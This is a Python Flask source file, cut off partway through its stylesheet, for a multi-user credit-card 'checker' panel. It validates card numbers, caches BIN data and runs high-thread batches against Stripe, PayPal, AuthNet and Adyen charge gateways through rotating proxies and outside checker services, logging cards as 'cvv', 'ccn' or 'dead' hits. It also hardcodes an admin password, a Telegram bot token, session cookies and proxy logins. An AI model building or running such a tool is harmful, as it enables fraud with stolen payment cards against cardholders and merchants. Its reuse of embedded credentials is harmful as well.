#!/usr/bin/env python3
import os,sys,json,time,random,string,re,hashlib,hmac,threading,uuid,asyncio,ssl,collections,concurrent.futures,urllib.request,urllib.error
from urllib.parse import quote
from functools import wraps
sys.stdout.reconfigure(encoding="utf-8")
from dotenv import load_dotenv
load_dotenv()
from flask import Flask,request,jsonify,session,redirect
from flask_socketio import SocketIO,join_room,leave_room
import aiohttp
import websocket

app=Flask(__name__)
_SECRET_FILE=".secret_key"
if os.path.exists(_SECRET_FILE):app.secret_key=open(_SECRET_FILE).read()
else:app.secret_key=os.urandom(32).hex();open(_SECRET_FILE,"w").write(app.secret_key)
sio=SocketIO(app,cors_allowed_origins="*",async_mode="threading",ping_timeout=60,ping_interval=25,max_http_buffer_size=1024*1024)
_API_PREFIX="/x/"+uuid.uuid4().hex[:10]

DATA_FILE="web_data.json"
WORKERS=int(os.getenv("WORKERS","5000"))
MAX_PER_USER=int(os.getenv("MAX_PER_USER","500"))
USE_PROXIES=os.getenv("USE_PROXIES","true").strip().lower() in("1","true","yes","on")
DIRECT_FALLBACK=os.getenv("DIRECT_FALLBACK","true").strip().lower() in("1","true","yes","on")
DIRECT_SESSION_MULT=max(1,int(os.getenv("DIRECT_SESSION_MULT","2")))
TARGET_PER_SESSION=max(1,int(os.getenv("TARGET_PER_SESSION","10")))
RANDOM_SESSION_PICK=os.getenv("RANDOM_SESSION_PICK","true").strip().lower() in("1","true","yes","on")
LANE_PICK_SAMPLES=max(2,int(os.getenv("LANE_PICK_SAMPLES","7")))
DEDUPE_INPUT=os.getenv("DEDUPE_INPUT","true").strip().lower() in("1","true","yes","on")
PROXY_PREFLIGHT=os.getenv("PROXY_PREFLIGHT","true").strip().lower() in("1","true","yes","on")
PROXY_PROBE_TRIES=max(1,int(os.getenv("PROXY_PROBE_TRIES","2")))
PROXY_PROBE_TIMEOUT=max(3.0,float(os.getenv("PROXY_PROBE_TIMEOUT","8")))
SESSION_PREFLIGHT=os.getenv("SESSION_PREFLIGHT","true").strip().lower() in("1","true","yes","on")
SESSION_PREFLIGHT_TIMEOUT=max(1.0,float(os.getenv("SESSION_PREFLIGHT_TIMEOUT","3")))
LANE_FAIL_TRIGGER=max(1,int(os.getenv("LANE_FAIL_TRIGGER","2")))
LANE_COOLDOWN_BASE=max(0.2,float(os.getenv("LANE_COOLDOWN_BASE","1.2")))
LANE_COOLDOWN_MAX=max(LANE_COOLDOWN_BASE,float(os.getenv("LANE_COOLDOWN_MAX","45")))
COOL_ON_TIMEOUT=os.getenv("COOL_ON_TIMEOUT","true").strip().lower() in("1","true","yes","on")
CONNECTOR_LIMIT_SCALE=max(1.0,float(os.getenv("CONNECTOR_LIMIT_SCALE","1.5")))
MAX_PER_HOST=max(1,int(os.getenv("MAX_PER_HOST","220")))
PROXY_TEST_CC=os.getenv("PROXY_TEST_CC","4242424242424242|12|2030|123")
USE_REAL_GATEWAY_API=os.getenv("USE_REAL_GATEWAY_API","true").strip().lower() in("1","true","yes","on")
RAINBOW_WS_URL=os.getenv("RAINBOW_WS_URL","wss://rainbowponk.com/ws/")
RAINBOW_BASE_URL=os.getenv("RAINBOW_BASE_URL","https://rainbowponk.com/").rstrip("/")+"/"
RAINBOW_TOKEN=os.getenv("RAINBOW_TOKEN","eyJ0ZWxlZ3JhbV9pZCI6IjY4MTI1MzU1MjYiLCJleHAiOjE3ODA1OTM5Njl9.47f3e1185477b932eea10ce01b6863431e2b5aecebb6c353ef4d02de10bbef36")
RAINBOW_PHPSESSID=os.getenv("RAINBOW_PHPSESSID","pln8d7t8m1fh9glqghniimjejl")
RAINBOW_THREADS=max(1,int(os.getenv("RAINBOW_THREADS","160")))
RAINBOW_PROXY_TIMEOUT=max(2.0,float(os.getenv("RAINBOW_PROXY_TIMEOUT","10")))
RAINBOW_PROXY_LIMIT=max(1,int(os.getenv("RAINBOW_PROXY_LIMIT","95")))
PAYPAL_PROXY_LIMIT=max(1,int(os.getenv("PAYPAL_PROXY_LIMIT","125")))
STRIPE_CHARGE_PROXY_LIMIT=max(1,int(os.getenv("STRIPE_CHARGE_PROXY_LIMIT","55")))
RAINBOW_RETRY_NO_PROXY=os.getenv("RAINBOW_RETRY_NO_PROXY","true").strip().lower() in("1","true","yes","on")
RAINBOW_RETRY_THREADS=max(1,int(os.getenv("RAINBOW_RETRY_THREADS","80")))
RAINBOW_PROXY_RETRY_PASSES=max(1,int(os.getenv("RAINBOW_PROXY_RETRY_PASSES","1")))
PAYPAL_PROXY_RETRY_PASSES=max(1,int(os.getenv("PAYPAL_PROXY_RETRY_PASSES","1")))
STRIPE_CHARGE_PROXY_RETRY_PASSES=max(1,int(os.getenv("STRIPE_CHARGE_PROXY_RETRY_PASSES","3")))
RAINBOW_PROXY_QUICKCHECK=os.getenv("RAINBOW_PROXY_QUICKCHECK","true").strip().lower() in("1","true","yes","on")
RAINBOW_PROXY_QUICKCHECK_LIMIT=max(5,int(os.getenv("RAINBOW_PROXY_QUICKCHECK_LIMIT","55")))
RAINBOW_PROXY_QUICKCHECK_TIMEOUT=max(1.5,float(os.getenv("RAINBOW_PROXY_QUICKCHECK_TIMEOUT","4")))
RAINBOW_PROXY_TEST_URL=os.getenv("RAINBOW_PROXY_TEST_URL","https://rainbowponk.com/api/x/h")
RAINBOW_WS_IDLE_TIMEOUT=max(10.0,float(os.getenv("RAINBOW_WS_IDLE_TIMEOUT","35")))
STRIPE_CHARGE_WS_IDLE_TIMEOUT=max(8.0,float(os.getenv("STRIPE_CHARGE_WS_IDLE_TIMEOUT","55")))
RAINBOW_WS_MAX_TIMEOUT=max(RAINBOW_WS_IDLE_TIMEOUT+5,float(os.getenv("RAINBOW_WS_MAX_TIMEOUT","240")))
STRIPE_CHARGE_THREADS=max(1,int(os.getenv("STRIPE_CHARGE_THREADS","72")))
STRIPE_CHARGE_RETRY_THREADS=max(1,int(os.getenv("STRIPE_CHARGE_RETRY_THREADS","40")))
STRIPE_CHARGE_DIRECT_THREADS=max(1,int(os.getenv("STRIPE_CHARGE_DIRECT_THREADS","60")))
STRIPE_CHARGE_THREADS_PER_PROXY=max(1,int(os.getenv("STRIPE_CHARGE_THREADS_PER_PROXY","2")))
STRIPE_CHARGE_WARMUP_BATCH=max(40,int(os.getenv("STRIPE_CHARGE_WARMUP_BATCH","99999")))
STRIPE_CHARGE_WARMUP_THREADS=max(20,int(os.getenv("STRIPE_CHARGE_WARMUP_THREADS","90")))
PAYPAL_THREADS=max(1,int(os.getenv("PAYPAL_THREADS","90")))
PAYPAL_RETRY_THREADS=max(1,int(os.getenv("PAYPAL_RETRY_THREADS","48")))
PAYPAL_DIRECT_THREADS=max(1,int(os.getenv("PAYPAL_DIRECT_THREADS","62")))
PAYPAL_THREADS_PER_PROXY=max(1,int(os.getenv("PAYPAL_THREADS_PER_PROXY","3")))
SHOPIFY_CHARGE_THREADS=max(1,int(os.getenv("SHOPIFY_CHARGE_THREADS","110")))
SHOPIFY_CHARGE_RETRY_THREADS=max(1,int(os.getenv("SHOPIFY_CHARGE_RETRY_THREADS","66")))
SHOPIFY_CHARGE_DIRECT_THREADS=max(1,int(os.getenv("SHOPIFY_CHARGE_DIRECT_THREADS","72")))
SHOPIFY_THREADS_PER_PROXY=max(1,int(os.getenv("SHOPIFY_THREADS_PER_PROXY","3")))
RAINBOW_GENERIC_THREADS=max(1,int(os.getenv("RAINBOW_GENERIC_THREADS","126")))
RAINBOW_GENERIC_RETRY_THREADS=max(1,int(os.getenv("RAINBOW_GENERIC_RETRY_THREADS","74")))
RAINBOW_GENERIC_DIRECT_THREADS=max(1,int(os.getenv("RAINBOW_GENERIC_DIRECT_THREADS","84")))
RAINBOW_GENERIC_THREADS_PER_PROXY=max(1,int(os.getenv("RAINBOW_GENERIC_THREADS_PER_PROXY","3")))
STRIPE_AUTH_WORKERS=max(1,int(os.getenv("STRIPE_AUTH_WORKERS","5000")))
STRIPE_AUTH_MAX_PER_USER=max(1,int(os.getenv("STRIPE_AUTH_MAX_PER_USER","600")))
STRIPE_AUTH_HARD_THREADS=max(1,int(os.getenv("STRIPE_AUTH_HARD_THREADS","150")))
STRIPE_AUTH_DIRECT_THREADS=max(1,int(os.getenv("STRIPE_AUTH_DIRECT_THREADS","100")))
STRIPE_AUTH_PROXY_LIMIT=max(1,int(os.getenv("STRIPE_AUTH_PROXY_LIMIT","50")))
STRIPE_AUTH_TARGET_PER_SESSION=max(1,int(os.getenv("STRIPE_AUTH_TARGET_PER_SESSION","40")))
STRIPE_AUTH_CONNECTOR_LIMIT_SCALE=max(1.0,float(os.getenv("STRIPE_AUTH_CONNECTOR_LIMIT_SCALE","3.0")))
STRIPE_AUTH_MAX_PER_HOST=max(1,int(os.getenv("STRIPE_AUTH_MAX_PER_HOST","500")))
STRIPE_AUTH_PROXY_PREFLIGHT=os.getenv("STRIPE_AUTH_PROXY_PREFLIGHT","false").strip().lower() in("1","true","yes","on")
RAINBOW_RETRY_WITH_PROXY=os.getenv("RAINBOW_RETRY_WITH_PROXY","true").strip().lower() in("1","true","yes","on")
FORCE_MAIN_SOURCE_PROXIES=os.getenv("FORCE_MAIN_SOURCE_PROXIES","true").strip().lower() in("1","true","yes","on")
FORCE_PROXY_ONLY=os.getenv("FORCE_PROXY_ONLY","true").strip().lower() in("1","true","yes","on")
MAIN_PROXY_CACHE_TTL=max(60,int(os.getenv("MAIN_PROXY_CACHE_TTL","3600")))
RAINBOW_PROXY_FETCH_RETRIES=max(1,int(os.getenv("RAINBOW_PROXY_FETCH_RETRIES","3")))
RAINBOW_PROXY_FETCH_RETRY_DELAY=max(0.1,float(os.getenv("RAINBOW_PROXY_FETCH_RETRY_DELAY","0.7")))
RAINBOW_PROXY_WARMUP=os.getenv("RAINBOW_PROXY_WARMUP","true").strip().lower() in("1","true","yes","on")
PAYPAL_FORCE_PROXIES=os.getenv("PAYPAL_FORCE_PROXIES","true").strip().lower() in("1","true","yes","on")
PAYPAL_PROXY_ONLY=os.getenv("PAYPAL_PROXY_ONLY","false").strip().lower() in("1","true","yes","on")
STRIPE_CHARGE_FORCE_PROXIES=os.getenv("STRIPE_CHARGE_FORCE_PROXIES","true").strip().lower() in("1","true","yes","on")
STRIPE_CHARGE_PROXY_ONLY=os.getenv("STRIPE_CHARGE_PROXY_ONLY","true").strip().lower() in("1","true","yes","on")
ADMIN_USER=os.getenv("ADMIN_USER","admin")
ADMIN_PASS=os.getenv("ADMIN_PASS","@ryuxx_x")
TG_BOT_TOKEN=os.getenv("TG_BOT_TOKEN","8710163270:AAGyW6MdYXRl8n1Jt49HiKXt1qVnqMuojYs")
_otp_store={}
_otp_lock=threading.Lock()
_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
_PROXIES=[]
for i in range(1,20):
    p=os.getenv(f"PROXY_{i}","")
    if p:_PROXIES.append(p)
_ACCOUNTS=[]
for i in range(1,20):
    c=os.getenv(f"AYANO_COOKIES_{i}","") if i>1 else os.getenv("AYANO_COOKIES","")
    if c:_ACCOUNTS.append({"User-Agent":_UA,"Cookie":c,"Origin":"https://core.ayanochk.vip","Referer":"https://core.ayanochk.vip/home.php","Content-Type":"application/x-www-form-urlencoded"})
if not _ACCOUNTS:_ACCOUNTS=[{"User-Agent":_UA,"Cookie":"","Origin":"https://core.ayanochk.vip","Referer":"https://core.ayanochk.vip/home.php","Content-Type":"application/x-www-form-urlencoded"}]

GATEWAYS={
    "1":{"label":"STRIPE $1","gateway":"Stripe + Zuora","backend":"api/api_stripe_1.php","api":"Stripe Charged 1$","engine":"rainbow"},
    "5":{"label":"STRIPE AUTH","gateway":"Stripe + Zuora","backend":"api/api_stripe_3v1.php","api":"Stripe Charged 1$","engine":"ayano"},
    "6":{"label":"PAYPAL $1","gateway":"Paypal","backend":"api/api_paypal_1.php","api":"Paypal Charged 1$","engine":"rainbow"},
    "7":{"label":"AUTHNET","gateway":"RANDOM GATE","backend":"api/api_authnet_1.php","api":"AuthNet Charged 1$ CCV","engine":"rainbow"},
    "3":{"label":"FASTSPRING","gateway":"RANDOM GATE","backend":"api/api_fastpring_1.php","api":"Fastpring Charged 19$","engine":"rainbow"},
    "4":{"label":"ADYEN AUTH","gateway":"Adyen","backend":"api/api_chargefy_1.php","api":"Adyen Chargefy Auth","engine":"rainbow"},
}

_FALLBACK_PROXIES=[
    "136.179.19.164:3128:llewellynashleybowen:rNXaRJfNPN233zw",
    "191.96.254.138:6185:akihzash:p8vnc0jutlq3",
    "173.211.126.255:8408:oakcreek:ZyjlxH",
]

_MAIN_PROXY_CACHE=[]
_MAIN_PROXY_CACHE_TS=0.0

def _rainbow_cookie():
    if not RAINBOW_TOKEN or not RAINBOW_PHPSESSID:return ""
    return f"token={RAINBOW_TOKEN}; PHPSESSID={RAINBOW_PHPSESSID}"

def _warmup_rainbow_session(cookie):
    if not cookie:return
    try:
        req=urllib.request.Request(RAINBOW_BASE_URL+"api/x/h",data=b"",
            headers={"Cookie":cookie,"Origin":"https://rainbowponk.com","Content-Type":"application/json"})
        urllib.request.urlopen(req,timeout=RAINBOW_PROXY_TIMEOUT)
    except Exception:
        pass

def _fetch_rainbow_proxies():
    global _MAIN_PROXY_CACHE,_MAIN_PROXY_CACHE_TS
    ck=_rainbow_cookie()
    if not ck:
        if _MAIN_PROXY_CACHE and (time.time()-_MAIN_PROXY_CACHE_TS)<=MAIN_PROXY_CACHE_TTL:return list(_MAIN_PROXY_CACHE)
        return []
    for i in range(RAINBOW_PROXY_FETCH_RETRIES):
        if RAINBOW_PROXY_WARMUP:_warmup_rainbow_session(ck)
        try:
            req=urllib.request.Request(RAINBOW_BASE_URL+"api/proxy/admin",
                headers={"Cookie":ck,"Origin":"https://rainbowponk.com","Referer":"https://rainbowponk.com/checker"})
            resp=urllib.request.urlopen(req,timeout=RAINBOW_PROXY_TIMEOUT)
            raw=json.loads(resp.read().decode())
            out=raw.get("proxies",[])
            if not isinstance(out,list):
                di=raw.get("data",{}) if isinstance(raw,dict) else {}
                out=di.get("proxies",[]) if isinstance(di,dict) else []
            if isinstance(out,list):
                seen=set();rows=[]
                for p in out:
                    if isinstance(p,str) and p.count(":")>=3 and p not in seen:
                        seen.add(p);rows.append(p)
                if rows:
                    _MAIN_PROXY_CACHE=rows
                    _MAIN_PROXY_CACHE_TS=time.time()
                    return rows
        except Exception:
            pass
        if i+1<RAINBOW_PROXY_FETCH_RETRIES:
            time.sleep(RAINBOW_PROXY_FETCH_RETRY_DELAY)
    if _MAIN_PROXY_CACHE and (time.time()-_MAIN_PROXY_CACHE_TS)<=MAIN_PROXY_CACHE_TTL:
        return list(_MAIN_PROXY_CACHE)
    return []

def _get_proxy_rows(require_main=False):
    rows=_fetch_rainbow_proxies()
    if rows:return rows
    if require_main or FORCE_MAIN_SOURCE_PROXIES:return []
    rows=[p for p in _PROXIES if isinstance(p,str) and p.count(":")>=3]
    if rows:return rows
    return list(_FALLBACK_PROXIES)

def _proxy_connect_ok(px,timeout=None):
    try:
        parts=str(px).split(":",3)
        if len(parts)!=4:return False
        pu=f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        opener=urllib.request.build_opener(urllib.request.ProxyHandler({"http":pu,"https":pu}))
        req=urllib.request.Request(RAINBOW_PROXY_TEST_URL,data=b"",headers={"Origin":"https://rainbowponk.com"})
        opener.open(req,timeout=timeout or RAINBOW_PROXY_QUICKCHECK_TIMEOUT)
        return True
    except urllib.error.HTTPError:
        return True
    except Exception:
        return False

def _quick_filter_proxies(rows):
    if not RAINBOW_PROXY_QUICKCHECK:return list(rows)
    sample=list(rows)[:RAINBOW_PROXY_QUICKCHECK_LIMIT]
    if not sample:return []
    workers=min(24,max(4,len(sample)))
    good=[]
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs={ex.submit(_proxy_connect_ok,p,RAINBOW_PROXY_QUICKCHECK_TIMEOUT):p for p in sample}
        for f,p in futs.items():
            try:
                if f.result():good.append(p)
            except Exception:
                pass
    return good if good else sample[:min(len(sample),12)]

def _parse_infobin(txt,elapsed=0):
    info={"brand":"?","type":"?","level":"?","bank":"?","country":"?","elapsed":elapsed}
    if not txt:return info
    t=str(txt).strip()
    m=re.search(r"\[([^\]]+)\]",t)
    if m:info["brand"]=m.group(1).strip() or "?"
    body=t[m.end():].strip(" -") if m else t
    parts=[p.strip() for p in body.split(" - ") if p.strip()]
    if parts:info["type"]=parts[0]
    if len(parts)>1:info["level"]=parts[1]
    if len(parts)>2:info["country"]=parts[-1]
    return info

_bin_lock=threading.Lock()
bin_cache=collections.OrderedDict()
_BIN_CACHE_MAX=5000
_data_lock=threading.Lock()

def _env_float(name,default):
    try:return float(os.getenv(name,str(default)))
    except Exception:return float(default)

def _timeout(prefix,d_total,d_conn,d_read):
    total=max(1.0,_env_float(prefix+"_TOTAL_TIMEOUT",d_total))
    conn=max(0.2,min(total,_env_float(prefix+"_CONNECT_TIMEOUT",d_conn)))
    read=max(0.2,min(total,_env_float(prefix+"_READ_TIMEOUT",d_read)))
    return aiohttp.ClientTimeout(total=total,sock_connect=conn,sock_read=read)

# Pre-compiled regex & SSL context (avoid per-job rebuild)
_HTML_RE=re.compile(r"<[^>]+>")
_NOSSL=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT);_NOSSL.check_hostname=False;_NOSSL.verify_mode=ssl.CERT_NONE
_ENC_TIMEOUT=_timeout("ENC",5,2,5)
_CHK_TIMEOUT=_timeout("CHK",15,3,15)
_STRIPE_AUTH_ENC_TIMEOUT=_timeout("STRIPE_AUTH_ENC",5,2,5)
_STRIPE_AUTH_CHK_TIMEOUT=_timeout("STRIPE_AUTH_CHK",12,3,12)

# In-memory data store - loaded once, saved periodically
_DB=None
_DB_DIRTY=False

def _load_from_disk():
    if os.path.exists(DATA_FILE):
        try:return json.load(open(DATA_FILE,encoding="utf-8"))
        except(json.JSONDecodeError,UnicodeDecodeError):pass
    return {"users":{},"keys":{},"stats":{"checked":0,"cvv":0,"ccn":0,"dead":0},"hits":[]}

def _save_to_disk():
    global _DB_DIRTY
    if _DB and _DB_DIRTY:
        with _data_lock:
            try:json.dump(_DB,open(DATA_FILE,"w",encoding="utf-8"),indent=2)
            except:pass
            _DB_DIRTY=False

def _bg_saver():
    while True:
        time.sleep(10)
        _save_to_disk()

def load_data():
    global _DB
    if _DB is None:_DB=_load_from_disk()
    return _DB

def save_data(d=None):
    global _DB_DIRTY
    _DB_DIRTY=True
def gen_key():return"-".join("".join(random.choices(string.ascii_uppercase+string.digits,k=4))for _ in range(4))
_CC_CLEAN1=re.compile(r"[\s/:\-]+")
_CC_CLEAN2=re.compile(r"[^0-9|]")
_NOW_YEAR=time.localtime().tm_year
_NOW_MONTH=time.localtime().tm_mon
def clean_cc(raw):
    raw=_CC_CLEAN1.sub("|",raw.strip());raw=_CC_CLEAN2.sub("",raw)
    p=[x for x in raw.split("|")if x]
    if len(p)<3:return None
    if len(p)==3:p.append("000")
    n,mm,yy,cv=p[0],p[1],p[2],p[3]
    if len(mm)==1:mm="0"+mm
    if len(yy)==2:yy="20"+yy
    if len(n)<13 or len(cv)<3:return None
    try:
        m,y=int(mm),int(yy)
        if m<1 or m>12:return None
        if y<_NOW_YEAR or(y==_NOW_YEAR and m<_NOW_MONTH):return None
    except:return None
    return f"{n}|{mm}|{yy}|{cv}"

def login_required(f):
    @wraps(f)
    def wrap(*a,**kw):
        if session.get("admin"):return f(*a,**kw)
        tuid=session.get("tuid")
        if tuid:
            d=load_data();usr=d.get("users",{}).get(tuid,{})
            if usr.get("active_session") and usr.get("active_session")==session.get("_ks",""):return f(*a,**kw)
        k=session.get("key");d=load_data();ki=d["keys"].get(k)
        if not k or not ki or not ki.get("used"):session.clear();return redirect("/")
        if ki.get("active_session") and ki.get("active_session")!=session.get("_ks",""):session.clear();return redirect("/")
        return f(*a,**kw)
    return wrap
def admin_required(f):
    @wraps(f)
    def wrap(*a,**kw):
        if not session.get("admin"):return redirect("/admin/login")
        return f(*a,**kw)
    return wrap

_jobs_lock=threading.Lock()
active_jobs={}
user_jobs={}
sid_to_tok={}


def kill_job(job_id):
    j=active_jobs.get(job_id)
    if not j:return
    j["stop"].set()
    ws=j.get("ws")
    if ws:
        try:ws.close()
        except Exception:pass
    loop=j.get("loop")
    tasks=j.get("tasks",[])
    if loop and tasks:
        for t in tasks:
            try:
                if not t.done():loop.call_soon_threadsafe(t.cancel)
            except RuntimeError:pass

def kill_user_job(tok):
    jid=user_jobs.pop(tok,None)
    if jid:kill_job(jid)

@sio.on("connect")
def ws_connect():pass
@sio.on("disconnect")
def ws_disconnect():
    tok=sid_to_tok.pop(request.sid,None)
    if tok:kill_user_job(tok)
@sio.on("auth")
def ws_auth(data):
    tok=data.get("t","")if isinstance(data,dict)else""
    if tok and tok==session.get("_t"):
        sid_to_tok[request.sid]=tok
        session["_sid"]=request.sid;join_room("u_"+tok)
    if session.get("admin"):join_room("admin_room")

_WOOD=quote("<svg xmlns='http://www.w3.org/2000/svg' width='300' height='300'><filter id='w'><feTurbulence type='fractalNoise' baseFrequency='.02 .15' numOctaves='5' seed='2'/><feColorMatrix type='matrix' values='.15 .05 .02 0 .08  .12 .04 .01 0 .06  .08 .03 .01 0 .04  0 0 0 .12 0'/></filter><rect width='300' height='300' filter='url(%23w)'/></svg>",safe="")
CSS=f'''*{{margin:0;padding:0;box-sizing:border-box}}
html{{scroll-behavior:auto}}
body{{color:#fff;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;
background:#1e1618 url("data:image/svg+xml,{_WOOD}");background-size:300px;overflow-x:hidden}}
.wrap{{max-width:920px;margin:0 auto;padding:20px;position:relative;z-index:1}}
.hdr{{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid rgba(255,255,255,.06);margin-bottom:20px}}
.hdr a{{text-decoration:none}}
.cd{{background:rgba(30,20,20,.8);border:2px solid rgba(255,255,255,.2);border-radius:10px;padding:20px;margin-bottom:14px;transition:border-color .3s;box-shadow:0 0 0 1px rgba(255,255,255,.05)}}
.cd:hover{{border-color:rgba(255,255,255,.3)}}
.cd h2{{font-size:14px;color:rgba(255,255,255,.85);margin-bottom:12px;font-weight:700;text-transform:uppercase;letter-spacing:1px}}
.st{{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:16px}}
.st>div{{background:rgba(30,20,20,.85);border:2px solid rgba(255,255,255,.2);border-radius:10px;padding:18px 12px;text-align:center;transition:all .3s;box-shadow:0 0 0 1px rgba(255,255,255,.05)}}
.st>div:hover{{border-color:rgba(255,255,255,.35);transform:translateY(-2px)}}
.st3{{grid-template-columns:repeat(3,1fr)!important}}
.st .n{{font-size:28px;font-weight:700;color:#fff;transition:color .3s}}.st .l{{font-size:9px;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:2px;margin-top:6px}}
.ng{{color:#22c55e!important}}
.npop{{animation:statusPop .18s ease-out}}
.hbtn{{background:rgba(255,255,255,.06)!important;color:rgba(255,255,255,.7)!important;border:1px solid rgba(255,255,255,.1)!important;
padding:8px 18px!important;font-size:11px!important;letter-spacing:1.5px!important;text-decoration:none!important;display:inline-block;border-radius:6px!important;font-weight:600!important}}
.hbtn:hover{{background:rgba(255,255,255,.1)!important;color:#fff!important;border-color:rgba(255,255,255,.2)!important}}
.icn{{display:flex;align-items:center;justify-content:center;width:36px;height:36px;border-radius:6px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);transition:all .2s;text-decoration:none}}
.icn:hover{{background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.15)}}.icn:hover svg{{stroke:#fff}}
textarea{{width:100%;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.08);color:#fff;
padding:12px;padding-bottom:44px;border-radius:6px;font-size:13px;font-family:monospace;resize:vertical;min-height:100px;outline:none;transition:border-color .3s}}
.ta-wrap{{position:relative}}
.ta-acts{{position:absolute;bottom:8px;right:8px;display:flex;gap:6px;z-index:2}}
textarea:focus{{border-color:rgba(255,255,255,.15)}}
textarea::placeholder{{color:rgba(255,255,255,.25)}}
input{{width:100%;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.08);color:#fff;
padding:12px;border-radius:6px;font-size:13px;outline:none;transition:border-color .3s}}
input:focus{{border-color:rgba(255,255,255,.15)}}
input::placeholder{{color:rgba(255,255,255,.25)}}
.btn{{padding:11px 22px;border:none;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;letter-spacing:1px;transition:all .2s}}
.btn:active{{transform:scale(.96)}}
.ibtn{{width:32px;height:32px;border:none;border-radius:6px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .2s}}
.ibtn:active{{transform:scale(.9)}}
.ibtn.play{{background:#c41e1e}}.ibtn.play:hover{{background:#d42a2a;box-shadow:0 2px 15px rgba(200,30,30,.3)}}
.ibtn.stop{{background:#dc2626}}.ibtn.stop:hover{{background:#ef4444}}
.ibtn.play #_fi{{width:0;height:0;border-left:12px solid #fff;border-top:7px solid transparent;border-bottom:7px solid transparent;margin-left:2px}}
.ibtn.stop #_fi{{width:12px;height:12px;background:#fff;border-radius:2px}}
.sbtn{{display:inline-flex;align-items:center;padding:10px 20px}}
.bg{{background:#c41e1e;color:#fff}}.bg:hover{{background:#d42a2a;box-shadow:0 2px 15px rgba(200,30,30,.3)}}
.br{{background:#dc2626;color:#fff}}.br:hover{{background:#ef4444}}
.bs{{background:rgba(255,255,255,.06);color:rgba(255,255,255,.6);border:1px solid rgba(255,255,255,.08)}}.bs:hover{{color:#fff;border-color:rgba(255,255,255,.15)}}
.btn:disabled{{opacity:.2;cursor:not-allowed;transform:none!important;box-shadow:none!important}}
.bdl-ready{{background:#dc2626;color:#fff}}.bdl-ready:hover{{background:#ef4444;box-shadow:0 2px 15px rgba(220,38,38,.3)}}
#_k{{max-height:300px;overflow-y:auto;overflow-x:hidden;font-family:monospace;font-size:12px;scroll-behavior:auto;overscroll-behavior:contain;scrollbar-gutter:stable}}
#_hc,#_hv,#_hn,#ahv,#ahn{{scroll-behavior:auto;overscroll-behavior:contain;scrollbar-gutter:stable}}
#_m{{max-height:300px;overflow-y:auto}}
.r{{padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.03);display:flex;gap:6px;
white-space:nowrap;overflow:hidden;text-overflow:ellipsis;transition:background .2s}}
.r.rd{{animation:declineIn .14s ease-out}}
.r:hover{{background:rgba(255,255,255,.02)}}
.rv{{border-left:3px solid #22c55e;background:rgba(34,197,94,.05)}}.rn{{border-left:3px solid #22c55e;background:rgba(34,197,94,.04)}}
.rd{{border-left:3px solid rgba(255,255,255,.1);color:rgba(255,255,255,.7)}}
.r .t{{font-weight:800;min-width:42px;flex-shrink:0}}.tl{{color:#22c55e}}.tn{{color:#22c55e}}.td{{color:#ef4444}}.te{{color:#f59e0b}}
.r span:nth-child(2){{overflow:hidden;text-overflow:ellipsis;font-weight:600;color:#fff}}
.r .i{{color:rgba(255,255,255,.55);font-size:11px;margin-left:auto;flex-shrink:0}}
.hit{{border-left:3px solid #22c55e;padding:6px 10px;border-bottom:1px solid rgba(255,255,255,.03);display:flex;gap:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin:0}}
.hit:hover{{background:rgba(255,255,255,.02)}}
.hit b{{color:#fff;font-family:monospace;font-size:12px;font-weight:600;overflow:hidden;text-overflow:ellipsis;flex-shrink:1}}
.hit .d{{display:flex;gap:4px;font-size:11px;margin-left:auto;flex-shrink:0;color:rgba(255,255,255,.45)}}
.hit .d span{{display:none}}.hit .d span:first-child,.hit .d span:nth-child(3),.hit .d span:last-child{{display:inline}}
.hit .d strong{{color:#fff}}
.lw{{display:flex;justify-content:center;align-items:center;min-height:100vh;position:relative;z-index:1}}
.lc{{width:100%;max-width:380px;background:rgba(30,20,20,.9);border:2px solid rgba(255,255,255,.2);border-radius:12px;padding:40px 28px;text-align:center;
box-shadow:0 8px 40px rgba(0,0,0,.5)}}
.lc h1{{font-size:22px;letter-spacing:3px;margin-bottom:8px;color:#c41e1e}}
.lc p{{color:rgba(255,255,255,.5);font-size:12px;margin-bottom:25px}}
.lc .ig{{text-align:left;margin-bottom:14px}}.lc label{{display:block;font-size:11px;color:rgba(255,255,255,.45);margin-bottom:5px;text-transform:uppercase;letter-spacing:1px}}
.err{{color:#ef4444;font-size:12px;margin-bottom:12px;padding:8px 12px;background:rgba(200,30,30,.08);border:1px solid rgba(200,30,30,.15);border-radius:6px}}
.pb{{height:8px;background:rgba(255,255,255,.06);border-radius:4px;overflow:hidden;max-width:100%}}
.pb .f{{height:100%;background:linear-gradient(90deg,#6b1a13,#b83424,#ef4444,#b83424);background-size:220% 100%;transition:width .3s;border-radius:4px;max-width:100%}}
.hid{{display:none!important}}
.gwbar{{position:relative;margin-top:10px}}
.gwbtn{{display:block;width:100%!important;padding:7px 12px!important;font-size:11px!important;font-weight:600!important;letter-spacing:.5px!important;background:rgba(255,255,255,.02)!important;color:rgba(255,255,255,.4)!important;border:1px solid rgba(255,255,255,.06)!important;border-radius:5px!important;transition:all .1s!important;cursor:pointer!important;text-transform:uppercase!important;text-align:left!important;margin-bottom:2px!important}}
.gwbtn:hover{{background:rgba(220,38,38,.25)!important;color:#fff!important;border-color:rgba(239,68,68,.4)!important}}
.gwbtn.act{{background:rgba(220,38,38,.3)!important;color:#fff!important;border-color:rgba(239,68,68,.5)!important}}
.gwsel{{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.1);border-radius:6px;cursor:pointer;font-size:12px;font-weight:700;color:#fff;letter-spacing:.5px;transition:all .1s;text-transform:uppercase}}
